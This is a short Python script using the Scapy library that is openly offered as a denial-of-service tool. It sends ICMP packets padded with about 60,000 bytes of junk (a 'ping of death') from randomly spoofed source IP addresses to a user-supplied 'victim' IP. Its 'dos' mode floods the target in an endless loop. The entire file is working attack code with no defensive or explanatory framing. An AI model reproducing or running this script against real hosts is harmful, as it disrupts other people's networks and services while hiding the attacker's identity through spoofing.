#!/usr/bin/python3

from scapy.all import *
import sys
import argparse
from colorama import Fore

global GREEN, RED, YELLOW, MAGENTA, RESET
GREEN = Fore. GREEN
RED = Fore.RED
YELLOW = Fore.YELLOW
MAGENTA = Fore.MAGENTA
RESET = Fore.RESET



conf.checkIpAddr = False # To stop scapy from checking return packet originating from any packet that we have sent out

def randIP():
    addr = [192,168,0,1]
    delimiter = '.'

    addr[0] = str(random.randrange(11,197))
    addr[1] = str(random.randrange(0,255))
    addr[2] = str(random.randrange(0,255))
    addr[3] = str(random.randrange(2,254))

    assembled = addr[0] + delimiter + addr[1] + delimiter + addr[2] + delimiter + addr[3]

    return assembled

def ping_death(attack, victim_ip, num_req):


    if attack == "test":
        print(GREEN + "[+] send "+str(num_req)+" ICMP packets containing junk datas to " + victim_ip + RESET)
        for i in range(0,num_req):
            send(IP(dst=victim_ip, src=randIP())/ICMP()/("D0S"*20000), verbose=False, iface=net_interface)

    elif attack == "dos":
        print(GREEN + "[+] send continuously ICMP packets containing junk datas to " + victim_ip + RESET)
        while True:
            send(IP(dst=victim_ip, src=randIP())/ICMP()/("D0S"*20000), verbose=False, iface=net_interface)

    return True


parser = argparse.ArgumentParser()
parser.add_argument("-t", "--type", help="test/flood")
parser.add_argument("-v", "--victim_ip", help="victim ip")
parser.add_argument("-N", "--num_req", help="number of request")
parser.add_argument("-I", "--interface", help="interface(eth0, ...)")
args = parser.parse_args()

if args.type:
    type_attack = args.type

    if type_attack == "test":
        if args.num_req:
            num_request = int(args.num_req)
        else:
            num_request = 5
    else:
        num_request = 0 # means infinity of requests

if args.victim_ip:
    victim_ip = args.victim_ip

global net_interface
if args.interface:
    net_interface = args.interface
else:
    net_interface = "eth0"

ping_death(type_attack, victim_ip, num_request)

sys.exit(1)
